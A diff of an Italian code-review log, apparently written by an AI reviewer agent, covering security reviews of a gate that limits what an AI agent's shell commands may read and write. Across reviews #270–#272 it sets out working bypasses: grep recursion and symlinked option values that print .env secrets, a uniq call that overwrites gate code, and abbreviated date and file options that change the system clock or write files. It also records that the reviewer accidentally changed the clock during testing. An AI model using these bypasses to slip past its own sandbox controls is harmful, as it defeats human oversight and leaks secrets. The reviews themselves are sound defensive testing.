-  - Se `_write_livello2` va in eccezione restituisce `False`. Non è un buco: l'esecuzione esige comunque `_file_reale`. **ok**
-- `modules/telegram/bot.py:166` — il read-back mostra il file vero, con «(chiesto come «nota.md»)» se il nome è diverso, poi il diff, poi pro e contro.
-  - Rischio esaminato: falsificare il messaggio.
-  - Il contenuto entra nel messaggio solo come righe del diff, ognuna con il prefisso ` `, `+` o `-`. Pro e contro sono rientrati con `│ ` da `modules/telegram/bot.py:142`.
-  - Verificato: una finta intestazione «DIFF REALE» scritta dentro pro esce come `│ DIFF REALE…`. **ok**
-- `modules/telegram/bot.py:127` — `rendi_visibili`: nel diff reale `\r` diventa `<U+000D>`, lo spazio a larghezza zero `<U+200B>`, il controllo bidi `<U+202E>`. Ora il diff si spezza solo su `\n`. **riserva** (sotto)
-
-**Riserva**
-
-- **R-263-1 (BASSA)** — `rendi_visibili` controlla solo le categorie Cc/Cf/Zl/Zp/Co/Cs/Cn. Restano invisibili nelle righe `+` del diff:
-  - i selettori di variante (categoria Mn, es. U+FE0F, U+E0100…), che possono nascondere byte nel testo;
-  - i riempitivi «Lo» come U+3164;
-  - gli spazi non standard (Zs, es. NBSP).
-  
-  Verificato: `'a\xa0b\ufe0fc…ㅤe'` esce invariato. Non permettono di scrivere un file senza firma, ma due righe diverse possono sembrare uguali all'operatore. Correzione semplice: marcare anche Mn quando non c'è un carattere base visibile, oppure i blocchi U+FE00–FE0F e U+E0100–E01EF, più U+3164/U+115F/U+1160 e gli Zs diversi dallo spazio normale.
-
-**Limiti dichiarati nel design (`reports/design_cancello.md` §5b), verificati come presenti**
-
-- Il modello non può leggere `gas.py`, `brains/` e `modules/`, e i diff sopra 4096 caratteri non passano su Telegram.
-- Windows è fuori dal modello di minaccia.
-- Gli hard link già presenti non sono coperti.
-
-**Esiti riprodotti**
-
-- pytest: 942 passed.
-- `tests/test_unit_kernel.py`: 743 PASS, 0 FAIL.
-- Mutation fatte su una copia completa in cartella temporanea, mai sul repo: 742/1 per ciascuno dei due controlli nuovi.
-
-**Rischi esclusi esplicitamente**
-
-- Come il client Telegram mostra davvero `<U+XXXX>` e i caratteri in categoria Mn: non verificato, ho controllato solo il testo composto.
-- Una gara tra due processi nell'istante fra il controllo dell'impronta e la scrittura: non provata (finestra di microsecondi, nessun processo concorrente scrive file di livello 2 senza firma).
-- Il comportamento su macOS: solo ragionato dal codice (casefold, `resolve` mantiene le maiuscole/minuscole sia alla richiesta sia all'esecuzione, quindi `_file_reale` coincide), non eseguito.
-
-Ho scritto in memoria la riga contatore #263 e l'ho committata (1ee779b). Nella riga ho scritto per errore i numeri di riga gas.py:2621, gas.py:1705 e gas.py:2812: quelli giusti sono gas.py:2620, gas.py:1704 e gas.py:2813, che sono quelli citati in questo verdetto. Lo staging del diff sotto review è intatto.
-
-File rilevanti:
-- /home/user/Gas/gas.py
-- /home/user/Gas/modules/telegram/bot.py
-- /home/user/Gas/modules/gate/gate.py
-- /home/user/Gas/tests/test_unit_kernel.py
-- /home/user/Gas/reports/design_cancello.md
-- /home/user/Gas/.claude/agents/memoria_revisore.md
-
-### Review #264 RIEMESSO (fetta 3, prima review — BOCCIATO, non committato)
-
-Testo riemesso dal revisore su richiesta (regola F-verdetto-ritoccato): l'originale contiene esempi di regex in forma `path:riga` che il gate B legge come citazioni inesistenti; l'originale integrale è nella sezione «§4b» qui sotto.
+### Review #270
 
 ## VERDETTO: BOCCIATO
 
-(Verdetto #264 RIEMESSO su richiesta, regola F-verdetto-ritoccato: stesso esito e stessa sostanza dell'originale. Cambia solo la forma: gli esempi di regex non hanno più i due punti, così il gate non li legge come citazioni. La riga del regex è citata dove si trova oggi a HEAD: dopo la fix si è spostata da 44 a 46.)
-
-**Motivo del blocco (macchina di controllo, il gate B si indebolisce in alcuni casi).**
-
-- scripts/check_verdetto.py:46 — regex delle citazioni `_REF_RE`. Rischio esaminato: citazioni legittime perse o forme nuove accettate. Esito: **blocco**. Il primo lookbehind (backslash, lettera, due punti) impediva che un match partisse subito dopo quei caratteri. Però il motore regex ripartiva più avanti dentro lo stesso token, dopo una barra, un punto o un trattino. Confronto tra vecchio e nuovo regex:
-  - «D, due punti, x/gas.py, riga 5»: prima catturava x/gas.py, che non esiste a HEAD, quindi veniva rifiutato; con la prima fix catturava gas.py riga 5, accettata.
-  - «C, due punti, \x\a.gas.py, riga 4»: prima a.gas.py, rifiutata; poi gas.py riga 4, accettata.
-  - «C, due punti, \x\y/gas.py, riga 4»: prima y/gas.py, rifiutata; poi gas.py riga 4, accettata.
-  - «C, due punti, \x\modules/telegram/bot.py, riga 4»: con la prima fix catturava telegram/bot.py, risolta per suffisso da `_resolve_path` (scripts/check_verdetto.py:189).
-
-  Una fix al gate che lo rende più permissivo anche su un solo input è un blocco. Fix proposta: mettere nel lookbehind tutta la classe di caratteri del token, quindi anche punto, barra e trattino. Le citazioni legittime restano catturate: nome corto tra backtick, path tra parentesi, path in grassetto, intervalli, nomi con più punti. I percorsi relativi con «..» e quelli assoluti restano catturati e vengono rifiutati da `_resolve_path` come prima.
-
-**Elementi esaminati**
-- tests/test_unit_handoff_check.py:393 — due test nuovi, verdi (303 passed su gate e handoff_check). Coprivano solo la forma «C, due punti, backslash» e la lettera di unità seguita subito dal nome, non le forme miste. Esito: **riserva**, è proprio il buco del blocco.
-- .claude/agents/revisore.md:60 — la frase sulle citazioni di contesto ora è intera, il significato non cambia. Esito: **ok**.
-- .claude/commands/fine-task.md:243 — regola F-verdetto-ritoccato: mai ritoccare il verdetto, si chiede al revisore di riemetterlo e lo si dichiara accanto all'originale. È coerente col finding aperto in reports/stato_progetto.md:161 e rende la procedura più severa. Esito: **ok**.
-- .gitignore:8 — la riga per `.gas_history.json.*` copre i file tmp e corrupt scritti da gas.py:832 e gas.py:845. `.gas_history.json` resta ignorato e viene forzato con force-add come prima. Esito: **ok**.
-- modules/notte/notte.py:18 e modules/notte/notte.py:150 — solo a capo. La concatenazione implicita della f-string dà la stessa stringa. Esito: **ok**.
-- modules/telegram/bot.py:128 e modules/telegram/bot.py:140 — R-263-1 chiusa per NBSP, spazio ideografico, i selettori di variante FE00–FE0F ed E0100–E01EF e i riempitivi Hangul (verificato a mano). Nel test tests/test_unit_gate.py:515 ho controllato che i caratteri letterali FE0F e U+3164 sono davvero nel sorgente. Esito: **riserva R-264-2 (BASSA)**: restano invisibili U+034F (un carattere di unione invisibile, categoria Mn) e U+2800 (braille vuoto, So). Effetto collaterale accettato: il read-back mostra il cuore seguito da `<U+FE0F>` sulle emoji; è rumore, non un problema di sicurezza.
-
-**Rischio escluso**: non ho rilanciato la suite completa (945) né la sonda del kernel (743/0). Ho eseguito solo tests/test_unit_gate.py e tests/test_unit_handoff_check.py, perché la fetta non tocca gas.py. Non ho nemmeno verificato check_verdetto.py su un handoff reale: l'ho provato solo sul regex isolato e sui test.
-
-### Review #265 RIEMESSO (fetta 3, ri-review, commit `0480996`)
-
-Testo riemesso dal revisore su richiesta (stesso motivo); l'originale integrale è nella sezione «§4b» qui sotto.
-
-## VERDETTO: APPROVATO
-
-(Verdetto #265 RIEMESSO su richiesta, regola F-verdetto-ritoccato: stesso esito e stessa sostanza dell'originale. Cambia solo la forma: gli esempi di regex non hanno più i due punti.)
-
-Ri-review dopo la bocciatura #264. Le due cose che avevo chiesto sono state fatte: il gate B non accetta più le forme miste e i caratteri invisibili mancanti ora vengono mostrati.
-
-**Elementi esaminati**
-- scripts/check_verdetto.py:46 — ora il lookbehind contiene tutta la classe di caratteri del token (backslash, lettera, due punti, punto, barra, trattino). Così il regex non può più ripartire a metà di un percorso. Rischio esaminato: perdita di citazioni legittime. Ho confrontato vecchio e nuovo regex su testi veri:
-  - in reports/handoff.md le citazioni trovate sono 14 sia prima sia dopo;
-  - in .claude/agents/memoria_revisore.md passano da 389 a 386, e le 3 perse sono proprio le forme d'attacco che avevo scritto io nella #264.
-
-  Il gate è più severo di prima e non ha perso nulla di legittimo. Esito: **ok**.
-- tests/test_unit_handoff_check.py:401 — il test controlla che le 4 forme miste non vengano catturate e che le forme legittime restino catturate: intervallo, nome con più punti, percorso con «..», backtick, parentesi, grassetto. Esito: **ok**.
-- modules/telegram/bot.py:128 — U+034F (un carattere di unione invisibile) e U+2800 (braille vuoto) sono aggiunti a `_INVISIBILI_EXTRA`. L'ho verificato a mano: escono come `<U+034F>` e `<U+2800>`. Con questo R-264-2 è chiusa. Esito: **ok**.
-- tests/test_unit_gate.py:522 — il test copre i due caratteri nuovi. Esito: **ok**.
-- Le altre modifiche della fetta sono le stesse che avevo già giudicato ok nella #264: .claude/agents/revisore.md, .claude/commands/fine-task.md, .gitignore, modules/notte/notte.py.
-
-**Rischio escluso**: non ho rilanciato la suite completa (945 passed secondo l'agente) né la sonda del kernel. Ho eseguito solo tests/test_unit_gate.py e tests/test_unit_handoff_check.py (303 passed) e il confronto sul corpus reale. Non ho fatto girare check_verdetto.py sull'handoff finale della sessione, perché quell'handoff non esiste ancora.
-
-### Review #266 (correzioni dai finding di verifica-bot e verifica esterna #180, commit `4ad0d46`)
-
-## VERDETTO: APPROVATO
-
-Review #266 sul diff staged sopra 0f97ba7: tutte e cinque le correzioni fanno quello che dicono, e lo step nuovo in CI non indebolisce niente.
+**In breve.** Il diff dichiara chiusa R-269-1 (lettura del livello 3, cioè segreti, git, .claude e memoria, tramite `run_command`), ma non lo è. La forma più semplice, `grep -r SEGRETO` senza indicare una cartella, legge ancora `.env`. Il motivo: grep, se non riceve un percorso, cerca da sé nella cartella corrente, e il nuovo controllo guarda solo i percorsi scritti nel comando. Anche i file passati come valore di un'opzione (`--from-file=…`, `--file=…`, `-if …`) non vengono controllati. Ho riprodotto tutto su un kernel reale con `.env` e un symlink `innocuo.txt` che punta a `.env`.
 
 **Elementi del diff esaminati**
 
-- `.github/workflows/ci.yml:149` — aggiunge lo step «Run dotenv suite» nel job `unit-suite`, cioè il job del check obbligatorio.
-  - Rischio esaminato: uno step che resta verde anche quando un test fallisce, o che tocca il resto del job.
-  - Lo step usa `if: always()` e `set -o pipefail`, quindi un FAIL di pytest passa attraverso `tee` e fa fallire il job. Non c'è `continue-on-error` né `paths-ignore`, e gli altri step restano come prima.
-  - Il file YAML è valido (`yaml.safe_load`). `tests/test_unit_dotenv.py` prima non era chiamato da nessuna parte nella CI (grep sulla cartella `.github/`).
-  - Il controllo diventa più severo, non più debole. **ok**
-- `.github/workflows/ci.yml:218` — aggiunge la riga «Dotenv suite» nel riepilogo del job, con lo stesso schema delle altre suite, e gestisce il caso in cui il file di output non esiste. È solo presentazione, non decide l'esito. **ok**
-- `gas.py:2613` — `write_file` viene negato se il file risolto esiste e ha più di un collegamento (`st_nlink > 1`); se `stat` va in errore, nega comunque.
-  - Rischio esaminato: un hard link già presente porta un file delicato sotto un nome «libero».
-  - Il controllo sta prima del calcolo del livello, quindi vale per i livelli 1, 2 e 3. Un file nuovo (`is_file()` falso) passa normalmente.
-  - Mutation (controllo spento in una copia del repo in cartella temporanea): T82m fallisce, 743/1. **ok**
-- `tests/test_unit_kernel.py:7521` — T82m: hard link `alias.md` → `scripts/saluto.sh` con la finestra pulita. Risultato: negato e file intatto. Se il file system non permette hard link il test viene saltato, e il link viene tolto dopo il test. **ok**
-- `modules/telegram/bot.py:130` — aggiunge U+17B4, U+17B5, U+0338 e U+FFFC a `_INVISIBILI_EXTRA`, con il test in `tests/test_unit_gate.py`. **ok**
+- `gas.py:1493` — `_vet_letture` salta ogni argomento che inizia con `-` e controlla solo i percorsi indicati. Il rischio era la ricorsione senza percorso: si avvera. Tutti questi comandi passano il controllo e restituiscono il contenuto di `.env`:
+  - `grep -r SEGRETO` → `.env:SEGRETO=xyz`
+  - `grep -rn SEGRETO` → `.env:1:SEGRETO=xyz`
+  - `grep -R xyz` → `.env` e anche `innocuo.txt` (segue il symlink)
+  - `grep -d recurse SEGRETO` → `.env:SEGRETO=xyz`
+  - `grep --directories=recurse xyz` → `.env:SEGRETO=xyz`
 
-Ho controllato anche il testo, non il codice:
-- La docstring di `_carica_dotenv` è ora coerente con `_sanitized_subprocess_env`: le variabili coi nomi da segreto non arrivano a `run_command`, le altre sì.
-- `reports/design_cancello.md` §5b dichiara in modo esplicito che il codice che applica cancello e firma è di livello 2, cioè modificabile con una sola firma, e che portarlo al livello 3 è una decisione dell'operatore. È corretto: va lasciata all'operatore.
+  Il gate li classifica IRREVERSIBLE, quindi serve l'approvazione. Con `GAS_SANDBOX_MODE=os_strict` impostata diventano UNCERTAIN e a finestra pulita partono senza approvazione. Esito: **blocco**.
+- `gas.py:1493` (stesso salto delle opzioni) — un file passato come valore attaccato a un'opzione non viene mai controllato:
+  - `diff --from-file=innocuo.txt note.md` stampa `< SEGRETO=xyz`;
+  - `diff note.md --to-file=innocuo.txt` stampa `> SEGRETO=xyz`;
+  - `grep -o --file=innocuo.txt note.md` stampa `SEGRETO=xyz`.
 
-**Nota (non tracciata come riserva)**
+  La chiusura via symlink vale quindi solo quando il file è un argomento separato (`cat innocuo.txt` ora è negato correttamente). Esito: **blocco**.
+- `gas.py:1489` — per capire se il primo argomento è il pattern, il controllo riconosce `-e`/`-f` solo all'inizio dell'opzione. Se `f` sta dentro un gruppo di opzioni brevi (`-if innocuo.txt note.md`), il file dei pattern viene scambiato per il pattern e saltato. Così grep usa `.env` come file di pattern e ne conferma il contenuto (stampa `ciao SEGRETO=xyz`). Esito: **blocco** (stessa causa del punto precedente).
+- `gas.py:2723` — read_file nega un file con più collegamenti (`st_nlink > 1`), dopo il ricontrollo sul percorso risolto. Esito: **ok**, R-269-2 chiusa per read_file. Per run_command la stessa via resta aperta attraverso i valori delle opzioni.
+- `tests/test_unit_gate.py:526` — ora usa `head -n 50`, un comando che è nell'allowlist. Esito: **ok**, R-269-3 chiusa.
+- `tests/test_unit_kernel.py:7609` — T83e prova solo forme con una cartella o un symlink come argomento separato. Nessun test copre la ricorsione senza percorso né i file passati come valore di un'opzione. Esito: **riserva** (copertura insufficiente).
+- Falsi positivi: `grep -n x modules/a.py`, `grep -c modules modules/a.py` (pattern uguale al nome di una cartella) e `diff modules/a.py note.md` funzionano. `ls -R` mostra solo i nomi dei file, senza contenuti, quindi va bene così. `grep -A 3 SEGRETO .` è negato correttamente (il `3` preso per pattern è innocuo). Esito: **ok**.
 
-Il controllo sugli hard link è fail-closed anche per i file normali di livello 1: un file di dati con hard link legittimi (strumenti di deduplica, backup con `cp -al`) non si potrà scrivere. È coerente con «robustezza > potenza». Inoltre per un file delicato con hard link il messaggio di firma parte lo stesso, e il diniego arriva solo all'esecuzione: una firma sprecata, ma nessuna scrittura.
+**Correzione richiesta (proposta)**
 
-**Esiti riprodotti**
+1. Per grep, negare qualunque ricorsione:
+   - un gruppo di opzioni brevi che contiene `r` o `R`, per esempio `-rn`, `-iR`. Qualche falso positivo come `-er` è accettabile: in dubbio si nega;
+   - le opzioni lunghe `--recursive`, `--dereference-recursive`, `-d`/`--directories` in ogni forma.
+2. Per i file passati come valore di un'opzione (`--from-file`, `--to-file`, `-f`/`--file`, `-X`/`--exclude-from`), in forma separata, con `=` o attaccati in un gruppo breve: negarli in blocco, oppure estrarre il valore e passarlo dallo stesso controllo usato per gli argomenti. Negare in blocco è più robusto.
+3. Aggiungere a T83e tutte le forme elencate sopra, ciascuna con l'asserzione che `SEGRETO` non compare nell'output.
 
-- `tests/test_unit_dotenv.py` + `tests/test_unit_gate.py`: 269 passed.
-- `tests/test_unit_kernel.py`: 744 PASS, 0 FAIL.
+**Cosa NON ho verificato**
 
-**Rischi esclusi esplicitamente**
+- Non ho rieseguito pytest e la suite del kernel su questa versione (l'agente dichiara 947 passed e 754/0). Il verdetto si basa sulle riproduzioni dirette, che non dipendono dalle suite.
+- Le varianti di grep non GNU (BSD grep su macOS, dove giriamo di notte): non ho potuto provarle qui. BSD grep accetta comunque `-r`, e senza percorso legge lo standard input (non la cartella corrente), ma `-R` e `--file=` restano da provare sul Mac.
+- I binari dell'allowlist diversi da grep e diff (`comm`, `nl`, `cut`, …) con opzioni che leggono file: non li ho analizzati uno per uno, perché nessuno in GNU coreutils ha un'opzione che apre un file come `--from-file`.
 
-- La run reale su GitHub Actions dello step nuovo: non verificata, qui non posso lanciare la CI. Ho verificato solo il YAML e la logica dello step.
-- `st_nlink` su file system di rete o FUSE (dove può valere sempre 1): non provato, non c'è un ambiente così in dev.
-- Su questo diff non ho rilanciato la suite pytest completa (l'agente dichiara 945 passed): ho rilanciato solo dotenv, gate e kernel.
-
-Ho scritto la riga contatore #266 in memoria e l'ho committata (e74e2fe). Lo staging del diff sotto review è intatto.
+Memoria aggiornata (riga #270 più una lezione) e committata da sola (bb981ed).
 
 File rilevanti:
-- /home/user/Gas/.github/workflows/ci.yml
 - /home/user/Gas/gas.py
-- /home/user/Gas/modules/telegram/bot.py
 - /home/user/Gas/tests/test_unit_kernel.py
 - /home/user/Gas/tests/test_unit_gate.py
-- /home/user/Gas/reports/design_cancello.md
 - /home/user/Gas/.claude/agents/memoria_revisore.md
 
-### Review #267 (fetta 5, esito Telegram a schermo — commit `19b1a53`)
+### Review #271
+
+## VERDETTO: BOCCIATO
+
+**In breve.** La lista delle opzioni ammesse per grep e diff chiude tutte le forme della #270: le ho riprodotte e sono negate. Però l'apertura della lettura introduce una regressione grave, che ho riprodotto. `uniq` è nell'allowlist e il suo secondo argomento è un file in cui scrive. Il gate non nega più i nomi `gas.py` e `modules/`, quindi `uniq note.md modules/gate/gate.py` passa. Senza la sandbox bwrap (modalità di ripiego, il caso del Mac) sovrascrive il codice del cancello (livello 3, «mai, nemmeno con firma») e `gas.py`, senza firma né diff.
+
+**Elementi del diff esaminati**
+
+- `gas.py:1389` (contesto: `SHELL_ALLOWLIST`, non toccata) letta insieme alla nuova `modules/gate/gate.py:376`, che ora nega in run_command solo i nomi del livello 3. Rischio esaminato: binari dell'allowlist che scrivono su un loro argomento. Riprodotto su un kernel reale:
+
+  | Comando | Con bwrap (`os_strict`) | Senza bwrap (`os_with_fallback`) |
+  |---|---|---|
+  | `uniq note.md modules/gate/gate.py` | `Read-only file system`, file intatto | il file passa da `ORIGINALE` a `ciao` |
+  | `uniq note.md gas.py` | `Read-only file system`, file intatto | il file passa da `KERNEL` a `ciao` |
+
+  Il gate classifica il comando IRREVERSIBLE: l'operatore approva un «uniq» che sembra un comando di sola lettura, senza vedere diff né sapere che finisce su un file di livello 2 o 3. Prima di questo diff entrambi i comandi erano DENY, perché il gate negava per nome qualsiasi token `gas.py`/`modules`. Esito: **blocco**.
+- `gas.py:1484` (`_OPZIONI_CORTE_OK`/`_OPZIONI_LUNGHE_OK`) e `gas.py:1512` (`_vet_opzioni`). Rischio esaminato: ricorsione e file passati come valore di un'opzione. Riprodotti come negati:
+  - ricorsione: `grep -rn x`, `grep -hr x`, e `grep --rec SEGRETO`, cioè `--recursive` abbreviato (getopt accetta le abbreviazioni, ma il confronto esatto sulla lista lo nega);
+  - file da opzioni: `--file=`, `-if`, `diff --from-file=`.
+
+  Nelle lettere ammesse nessuna opzione apre file o fa ricorsione: per grep `nciwvFEoHhlLsqxABCme`, per diff `uqiwbBEyatcpU`. Esito: **ok**.
+- `gas.py:1540` (`_vet_letture`), riconoscimento del pattern di grep. Rischio esaminato: un file vero scambiato per pattern e quindi non controllato. Con `-e` presente ogni argomento viene controllato come percorso: `grep -e innocuo.txt note.md` viene negato. È un falso positivo che va nella direzione prudente, cioè accettabile. Con `-A 3` il `3` viene preso per pattern e il pattern vero viene controllato in più: anche questo va nella direzione prudente. Esito: **ok**.
+- `tests/test_unit_kernel.py:7629` (T83i) e `tests/test_unit_kernel.py:7636` (T83j) coprono le forme della #270 e le opzioni innocue. Nessun test copre i binari che scrivono su un loro argomento, né la modalità senza bwrap. Esito: **riserva**.
+- Altri binari dell'allowlist con un symlink verso `.env`: `tail -n 1`, `cat --`, `nl`, `comm`, `file`, `stat -L` sono tutti negati sul percorso risolto. `ls -la` mostra solo metadati. Esito: **ok**.
+
+**Correzione richiesta**
+
+1. `uniq` con al più un argomento non-opzione (anche dopo `--`), oppure toglierlo dall'allowlist.
+2. Negare `file -C`: compila e scrive `magic.mgc` nella cartella di lavoro.
+3. In generale, prima di togliere un nome dalla denylist dei token, controllare quali binari dell'allowlist hanno un argomento di output. Oggi l'ho trovato solo per `uniq` e `file -C`.
+4. Aggiungere un test nella modalità senza bwrap (`os_sandbox_available=False`, `os_with_fallback`) che provi che `gas.py` e `modules/gate/gate.py` restano intatti.
+
+**Falsi positivi dichiarati (non bloccanti)**
+
+`grep -rn TODO modules/` e `diff -r` sono negati: per cercare nel codice il modello deve prima elencare i file con `ls -R`, poi usare grep file per file. Anche `grep -P` e `--include` sono negati. È una perdita di comodità accettabile in una fetta di sicurezza. Un'eventuale ricorsione limitata a `brains/`/`modules/` è una scelta futura.
+
+**Cosa NON ho verificato**
+
+- Non ho rieseguito pytest e la suite del kernel su questa versione (l'agente dichiara 947 passed e 756/0). Il blocco si basa su una riproduzione diretta.
+- La sovrascrittura l'ho riprodotta qui, su GNU coreutils in modalità senza bwrap simulata. Non l'ho provata sul Mac vero (BSD `uniq`), dove però, per quanto so, la sintassi `uniq IN OUT` è la stessa.
+- `date -s` (cambiare l'ora di sistema, preesistente e fuori dal livello 3): non analizzato.
+
+Memoria aggiornata (riga #271 più una lezione) e committata da sola (5dc9779).
+
+File rilevanti:
+- /home/user/Gas/gas.py
+- /home/user/Gas/modules/gate/gate.py
+- /home/user/Gas/tests/test_unit_kernel.py
+- /home/user/Gas/.claude/agents/memoria_revisore.md
+
+### Review #272
+
+## VERDETTO: BOCCIATO
+
+**In breve.** La correzione di `uniq` funziona. Restano però aperte tutte le opzioni vietate di `file`, `wc` e `date`: il controllo le confronta per nome esatto, mentre questi comandi accettano anche il nome abbreviato (`--se` vale `--set`, `--compil` vale `--compile`). L'ho riprodotto: senza bwrap passano sia scritture sia letture di `.env`.
+
+**Attenzione, effetto collaterale della mia review.** Durante la prova, `date --se=2020-01-01` ha davvero cambiato l'orologio di sistema del container: senza bwrap il comando gira come root. L'ho rimesso a mano a `2026-10-11 14:23 UTC`, l'ultimo orario osservato. Può esserci uno scarto di qualche decina di secondi. Mentre l'orologio era sbagliato nessun commit è stato creato: le date degli ultimi commit (14:08, 14:13, 14:18) sono coerenti. Ho registrato la lezione in memoria: mai eseguire davvero, in review, comandi che cambiano lo stato globale.
+
+**Elementi del diff esaminati**
+
+- `gas.py:1521`, limite di `uniq` a un solo file. Rischio esaminato: un secondo argomento usato come file di output.
+  - `uniq note.md -` è negato;
+  - `uniq note.md` e `uniq -c note.md` sono permessi;
+  - `uniq --- note.md` passa il controllo ma `uniq` lo rifiuta da sé (opzione non riconosciuta).
+
+  Esito: **ok**.
+- `gas.py:1515` (`_OPZIONI_SCRIVONO`) e `gas.py:1509` (`_OPZIONI_FILE_VIETATE`). Rischio esaminato: nomi abbreviati delle opzioni lunghe. Riprodotto senza bwrap:
+
+  | Comando | Effetto |
+  |---|---|
+  | `file --compil` | crea `magic.mgc` (scrittura) |
+  | `date --se=2020-01-01` | cambia l'orologio di sistema |
+  | `file --magic=innocuo.txt note.md` | stampa `SEGRETO=xyz` nel messaggio d'errore |
+  | `file --files=innocuo.txt` | stampa `SEGRETO=xyz` |
+  | `wc --files0=innocuo.txt` | stampa `SEGRETO=xyz` |
+  | `date --fil=innocuo.txt` | stampa `SEGRETO=xyz` |
+
+  `innocuo.txt` è un symlink verso `.env`. Il controllo non lo intercetta perché il valore attaccato all'opzione non viene mai risolto. Esito: **blocco**.
+- `tests/test_unit_kernel.py:7650` (T83k) prova solo i nomi completi: nessuna forma abbreviata. Esito: **riserva**.
+- grep e diff non hanno questo problema, perché lì le opzioni lunghe sono una lista di nomi ammessi con confronto esatto: un nome abbreviato non è in lista e viene negato. Già provato nella #271 con `grep --rec`. Esito: **ok**.
+
+**Correzione richiesta**
+
+1. Anche per `file`, `wc` e `date` usare una lista di opzioni lunghe AMMESSE con confronto esatto, come per grep e diff (la soluzione più robusta). In alternativa, negare un'opzione lunga quando la parte prima di `=` è l'inizio di un nome vietato (per esempio `--se` è l'inizio di `--set`).
+2. Aggiungere a T83k le forme abbreviate della tabella. Va provato solo il controllo o la modalità dry-run: un test che esegue davvero `date -s` cambierebbe l'orologio della CI.
+
+**Cosa NON ho verificato**
+
+- Non ho rieseguito pytest e la suite del kernel (l'agente dichiara 947 passed e 758/0). Il blocco si basa su riproduzioni dirette.
+- La ricerca di altri binari dell'allowlist che scrivono su un argomento l'ho fatta solo a ragionamento sulle versioni GNU (ls, cat, head, tail, cut, tr, nl, comm, seq, printf, rev, stat: nessuno scrive). Non ho controllato le varianti BSD del Mac.
+- `tail -f` (comando che resta appeso fino al timeout di 60 secondi, preesistente) non è un problema di sicurezza e non l'ho tracciato.
+
+Memoria aggiornata (riga #272 più una lezione) e committata da sola (95b6b63).
+
+File rilevanti:
+- /home/user/Gas/gas.py
+- /home/user/Gas/tests/test_unit_kernel.py
+- /home/user/Gas/.claude/agents/memoria_revisore.md
+
+### Review #273 (commit `2e3e110`)
 
 ## VERDETTO: APPROVATO CON RISERVE
 
-Review #267 del diff staged sul branch feat/merge-automatico-z1xjx2 (PR #180). Prima della review ho letto CLAUDE.md, reports/stato_progetto.md (parti rilevanti) e .claude/agents/memoria_revisore.md.
+**In breve.** Le opzioni lunghe abbreviate di `file`, `wc` e `date` sono ora negate in ogni forma che ho provato. Le opzioni legittime restano permesse. Ho riprodotto le suite (pytest 947 passed, kernel 760 PASS e 0 FAIL). Il test nuovo cattura davvero il problema: se rimetto il confronto esatto dei nomi, T83l fallisce. Come richiesto, ho provato solo il controllo (`_vet_command`), senza eseguire nessun comando che cambi lo stato globale. L'orologio è rimasto coerente per tutta la review (14:26 e poi 14:28 UTC).
 
-**Parti del diff esaminate**
+**Elementi del diff esaminati**
 
-1. `modules/notte/notte.py:337` — nel ramo `except` di `_notifica_telegram` stampa «Riepilogo Telegram NON inviato: errore <Tipo>».
-   - Rischio: che a schermo esca il messaggio dell'eccezione, che può contenere testo non fidato.
-   - Esito: **ok**. Viene stampato solo `type(e).__name__`, come già fa il ramo del giro interrotto (`modules/notte/notte.py:445`). Il test lo verifica: la stringa "segreto-xyz" non compare nell'output.
+- `gas.py:1518` (`_lunga_vietata`) — un'opzione lunga è negata se il suo nome, prima di `=`, è l'inizio di un nome vietato. Rischio esaminato: abbreviazioni minime, nome vuoto, forme separate e gruppi di opzioni brevi.
+  - Negate: `file --c`, `--co`, `--m=`, `--ma=`, `--files-f=`, `--compile=`; `wc --f=`, `--files0-fro=`; `date --s 2020`, `--se 2020`, `--r=`, `--re`, `--f`, `--=x`; gruppi brevi `date -us`, `-uf`, `-ur` e `file -bC`, `-Cm`.
+  - Prova con mutation: se sostituisco il confronto per prefisso con quello esatto, T83l fallisce (759 PASS / 1 FAIL).
 
-2. `modules/notte/notte.py:345` — stampa il `motivo` restituito da `invia_notifica`.
-   - Rischio: che a schermo finiscano token, ID o il testo del messaggio.
-   - Esito: **ok**. Tutti i `return` di `modules/telegram/bot.py:251` (fino alla riga 274) restituiscono testi fissi: «TELEGRAM_BOT_TOKEN mancante», «…IDS mancante o senza ID validi», «testo oltre il limite», «invio fallito verso tutti i destinatari», «errore di invio». Nessuna stringa contiene valori presi da fuori.
+  Esito: **ok**.
+- `gas.py:1544` e `gas.py:1551` — lo stesso controllo è usato sia per le opzioni che scrivono sia per quelle che leggono file. Rischio esaminato: falsi positivi su usi legittimi. Restano permessi: `wc --lines`, `date --utc`, `--iso-8601`, `--date=tomorrow`, `--rfc-3339=date`, `--debug`, `-d tomorrow`, `file --brief`, `-L`, `wc -l`, `uniq -c`. L'unico falso positivo trovato è `date --r=…`, ambiguo tra `--reference` e `--rfc-*`: viene negato, ed è la direzione prudente. Esito: **ok**.
+- `tests/test_unit_kernel.py:7663` (T83l) — prova le forme abbreviate e quelle permesse solo sul controllo, senza eseguirle. Non tocca l'orologio della CI. Esito: **ok**.
+- Per contesto, le correzioni delle review precedenti sono tutte coperte da test che passano (riprodotto con le suite):
+  - #269: ricontrollo sul percorso risolto e hard link in read_file (`gas.py:2723`);
+  - #270: lista delle opzioni ammesse per grep e diff;
+  - #271: `uniq` con un solo file e `file -C` negato.
 
-3. `modules/notte/notte.py:457` (contesto) — `_notifica_telegram` è chiamata nel `finally`, dopo `lock_f.close()`.
-   - Rischio: che la stampa avvenga col lock ancora preso, che manchi nei rami del giro occupato o interrotto, o che cambi l'exit code.
-   - Esito: **ok**. La chiamata avviene a lock rilasciato. I rami del giro occupato (riga 394) e del giro interrotto (riga 447) passano entrambi da qui. Il valore di ritorno (0, 1 o 2) è deciso prima e il `print` non lo tocca.
+**Riserve (da tracciare in stato_progetto.md)**
 
-4. `modules/notte/notte.py:345` — riserva **R-267-1 (BASSA)**.
-   - I tre `print` nuovi (righe 337, 345 e 347) stanno fuori da qualsiasi try. Se stdout è chiuso, oppure arriva un errore di pipe rotta (EPIPE) o di disco pieno, l'eccezione esce dal `finally` di `esegui_giro` e prende il posto del `return`: il programma si chiude con un errore invece che con l'exit code.
-   - Questo va contro il contratto «Mai eccezioni» scritto nella docstring di `_notifica_telegram`.
-   - Il rischio esiste già con i `print` alle righe 392 e 445, e sotto launchd lo stdout è un file, quindi la probabilità è bassa. Correzione consigliata: mettere i `print` dentro un `try/except Exception: pass`.
+- **R-273-1 (BASSA)**: per `file`, `wc` e `date` resta un elenco di opzioni VIETATE. Se una versione futura aggiunge un'opzione che legge o scrive file, non sarebbe coperta. Per grep e diff, invece, c'è un elenco di opzioni ammesse, più robusto. Si può allineare in una fetta successiva.
+- **R-273-2 (BASSA)**: le versioni BSD (Mac) di `file`, `date`, `wc` e `uniq` non le ho provate.
 
